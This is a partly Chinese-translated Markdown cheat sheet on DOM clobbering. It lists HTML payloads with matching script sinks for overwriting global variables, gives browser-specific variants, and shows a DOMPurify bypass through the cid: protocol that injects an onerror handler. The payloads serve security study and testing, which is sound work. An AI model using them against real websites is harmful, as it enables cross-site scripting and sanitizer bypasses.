# DOM Clobbering（DOM劫持）

> DOM劫持是一种技术，通过使用某些ID或名称命名HTML元素，可以覆盖或“劫持”全局变量。这可能导致脚本中的意外行为，并可能引发安全漏洞。

## 概述

- 实验室
- 利用
- 参考资料

## 实验室

- 实验室：利用DOM劫持实现XSS
- 实验室：通过劫持DOM属性绕过HTML过滤器
- 实验室：受CSP保护的DOM劫持测试用例

## 利用

利用需要在页面中进行任何类型的`HTML注入`。

- 劫持`x.y.value`

```html
// Payload
<form id=x><output id=y>I've been clobbered</output>

// Sink
<script>alert(x.y.value);</script>
```

* ```markdown
    使用ID和name属性一起劫持`x.y`，形成一个DOM集合
    ```

    ```html
    // Payload
    <a id=x><a id=x name=y href="Clobbered">
    
    // Sink
    <script>alert(x.y)</script>
    ```

* 劫持`x.y.z` - 三级深度
    ```html
    // Payload
    <form id=x name=y><input id=z></form>
    <form id=x></form>
    
    // Sink
    <script>alert(x.y.z)</script>
    ```

* 劫持`a.b.c.d` - 超过三级

    ```html
    // Payload
    <iframe name=a srcdoc="
    <iframe srcdoc='<a id=c name=d href=cid:Clobbered>test</a><a id=c>' name=b>"></iframe>
    <style>@import '//portswigger.net';</style>
    
    // Sink
    <script>alert(a.b.c.d)</script>
    ```

* Clobbering `forEach` (Chrome only)
    ```html
    // Payload
    <form id=x>
    <input id=y name=z>
    <input id=y>
    </form>
    
    // Sink
    <script>x.y.forEach(element=>alert(element))</script>
    ```

* Clobbering `document.getElementById()` using `<html>` or `<body>` tag with the same `id` attribute
    ```html
    // Payloads
    <html id="cdnDomain">clobbered</html>
    <svg><body id=cdnDomain>clobbered</body></svg>


    // Sink 
    <script>
    alert(document.getElementById('cdnDomain').innerText);//clobbbered
    </script>
    ```

* Clobbering `x.username`
    ```html
    // Payload
    <a id=x href="ftp:Clobbered-username:Clobbered-Password@a">
    
    // Sink
    <script>
    alert(x.username)//Clobbered-username
    alert(x.password)//Clobbered-password
    </script>
    ```

* Clobbering (Firefox only)
    ```html
    // Payload
    <base href=a:abc><a id=x href="Firefox<>">
    
    // Sink
    <script>
    alert(x)//Firefox<>
    </script>
    ```

* Clobbering (Chrome only)
    ```html
    // Payload
    <base href="a://Clobbered<>"><a id=x name=x><a id=x name=xyz href=123>
    
    // Sink
    <script>
    alert(x.xyz)//a://Clobbered<>
    </script>
    ```


## Tricks

* DomPurify allows the protocol `cid:`, which doesn't encode double quote (`"`): `<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">`


## References

* [Dom Clobbering - PortSwigger](https://portswigger.net/web-security/dom-based/dom-clobbering)
* [Dom Clobbering - HackTricks](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/dom-clobbering)
* [DOM Clobbering strikes back - @garethheyes - 06 February 2020](https://portswigger.net/research/dom-clobbering-strikes-back)
* [Hijacking service workers via DOM Clobbering - @garethheyes - 29 November 2022](https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering)
* [Bypassing CSP via DOM clobbering - @garethheyes - 05 June 2023](https://portswigger.net/research/bypassing-csp-via-dom-clobbering)